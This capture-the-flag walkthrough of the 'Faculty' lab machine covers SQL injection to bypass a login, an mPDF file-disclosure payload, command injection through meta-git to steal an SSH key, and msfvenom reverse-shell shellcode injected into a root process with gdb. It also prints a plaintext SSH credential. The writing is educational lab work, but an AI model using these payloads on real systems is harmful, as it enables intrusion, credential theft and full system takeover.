---
layout: default
---

# Faculty

# Enumeration

IP → 10.10.11.169

Open ports.

```jsx
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```jsx
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT+Giw4wE1jz82gGRpuANEdRt+D6gp6hDmrcaODUiU/N+4nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt+q2m4eL+DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO/Z3FL3xynYeyLrFM+iEx0cMl9rIYWG8NzqVnBe180u+7d/y/kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn/GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0=
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd+YlbEo4Fpz3+UaOYyCJGFa/E29JORgMAIOXVlGUpvMgQqiaqDMXtbt/G03rGEI9h8dpFAmswN1LJ8uig=
|   256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d/3Tc/NAh0n9XH5lE9SBfl2dl+v6F+
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

### Tech and headers

```jsx
┌──(kali㉿kali)-[~/machines/linux/faculty/enumeration]
└─$ whatweb 10.10.11.169                                                                                                 
http://10.10.11.169 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], RedirectLocation[http://faculty.htb], Title[302 Found], nginx[1.18.0]
http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]

┌──(kali㉿kali)-[~/machines/linux/faculty/enumeration]
└─$ curl -L -I faculty.htb
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 06 Dec 2023 08:05:52 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=352nt4ha6k07c18akvbbsggtop; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 06 Dec 2023 08:05:52 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=kgaebqgentphujgk9mfo9i2shu; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

### Admin panel

![Untitled](/images/faculty3.png)

We can bypass the panel with a simple injection → `admin’ or 1=1-- -`

### ID login

![Untitled](/images/faculty2.png)

# Foothold

In the admin panel we can make a request to generate a PDF that is created using data supplied by us.

![Untitled](/images/faculty1.png)

The last one has been added by me. There are various ways we can try to exploit this.

- Tipical PDF injections
- Exploits for mdpf (pdf generator is leaked in the url)

If we search for mdpf exploits we eventually find the following payload:

- `<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />`

That can be used to include a file as an attached file to the PDF.

### Exploit file disclosure

We can get the **passwd** file from the victim. These are the users.

 

```jsx
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

We try to get the ssh key from the users but we get an error:

- We don’t have permission to read a file or the file doesn’t exist we get an error.

### Getting info about the proccess running the app

We will use the information contained in /proc/self/ to see if we can leak something.

- cmdline

```jsx
┌──(kali㉿kali)-[~/machines/linux/faculty]
└─$ cat cmdline              
php-fpm: pool www
```

### Reading source code

Let’s try to read some interesting files in the root of the web page.

```jsx
/index.php            (Status: 302) [Size: 12193] [--> login.php]
/login.php            (Status: 200) [Size: 4860]
/header.php           (Status: 200) [Size: 2871]
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
/test.php             (Status: 500) [Size: 0]
/topbar.php           (Status: 200) [Size: 1206]
```

The one that is strange is **test.php**. Since we don’t knowthe absolute path of the app in the machine we have to test with relative paths until we have something.

```jsx
require('./mpdf-6.0.0/mpdf.php');
$mpdf = new mPDF('c');

$mpdf->WriteHTML($html);
$mpdf->Output();
exit;
```

But is simply the file to generate the PDFs. We can see that the library is indeed mdpf. In the admin folder we have more stuff.

```jsx
/index.php            (Status: 302) [Size: 13897] [--> login.php]
/download.php         (Status: 200) [Size: 17]
/home.php             (Status: 200) [Size: 2995]
/login.php            (Status: 200) [Size: 5618]
/events.php           (Status: 500) [Size: 1193]
/header.php           (Status: 200) [Size: 2691]
/users.php            (Status: 200) [Size: 1593]
/assets               (Status: 301) [Size: 178] [--> http://faculty.htb/admin/assets/]
/faculty.php          (Status: 200) [Size: 8532]
/courses.php          (Status: 200) [Size: 9214]
/ajax.php             (Status: 200) [Size: 0]
/schedule.php         (Status: 200) [Size: 5553]
/database             (Status: 301) [Size: 178] [--> http://faculty.htb/admin/database/]
/navbar.php           (Status: 200) [Size: 1116]
/subjects.php         (Status: 200) [Size: 12744]
/topbar.php           (Status: 200) [Size: 1201]
```

If investigate the source code we will finally grab some credentials  from files that can’t be found using fuzzing. These credentials can be used to connect as a user via ssh.

- `gybolo:Co.met06aci.dly53ro.per`

# Privilege escalation

### Pivoting to user developer

User gybolo can execute a single command as the user developer.

```jsx
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

Searching for information about command injection with this file it seems like we can inject command using the clone feature. I haven’t been able to find a suitable payload so I try common injections bypassses, more over we can see exactly where is the command injected.

```jsx
chdir '/home/gbyolo/test/sss;ping -c 1 10.10.14.16'
```

To trigger the injection we can use the following payload.

```jsx
gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||touch ./dev'
```

We create a file as the user developer so we have command execution. Now we need a shell as this user. We try to dump his ssh key.

```jsx
gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
```

And we get it, now we can connect to the machine as the user developer.

### Getting root

This new user must have any new privilege to escalate that the previous did not. If we check out groups we will see that we are in two strange groups

- faculty
- debug

If we find file that are owned by this groups we will see that only the members of group debug are able to execute gdb.

```jsx
developer@faculty:/var/www/scheduling/admin$ find / -group "debug" 2>/dev/null
/usr/bin/gdb
```

The binary is not SUID so maybe it has special capabilities.

```jsx
developer@faculty:/var/www/scheduling/admin$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

It has `cap_sys_ptrace` capability that can be used to attach to any running program.

```jsx
┌──(kali㉿kali)-[~/machines/linux/faculty]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f py -o revshell.py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of py file: 384 bytes
Saved as: revshell.py
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/linux/faculty]
└─$ cat revshell.py           
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a\x0e\x10"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"
```

We use a script from hacktricks [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace) to generate the payload in the correct format to use it in gdb. 

```jsx
┌──(kali㉿kali)-[~/machines/linux/faculty]
└─$ python revshell.py       
set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x4851100e0a0abb01
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
```

Now we have to select a process running as root and debug it with GDB. We can choose any until one works. In this box we can use it with a sleep that root executes in time intervals or with the postfix process.

- postfix

```jsx
developer@faculty:/var/www/scheduling/admin$ gdb -p 1561
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.                                                                                                                                                                                           
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 1561
Reading symbols from /usr/lib/postfix/sbin/master...
(No debugging symbols found in /usr/lib/postfix/sbin/master)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f5cfc90042a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x4851100e0a0abb01
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 1561 is executing new program: /usr/bin/dash
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.
```

Once we continue with the execution we will have a reverse shell in our listener.

```jsx
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.169] 53690
whoami
root
```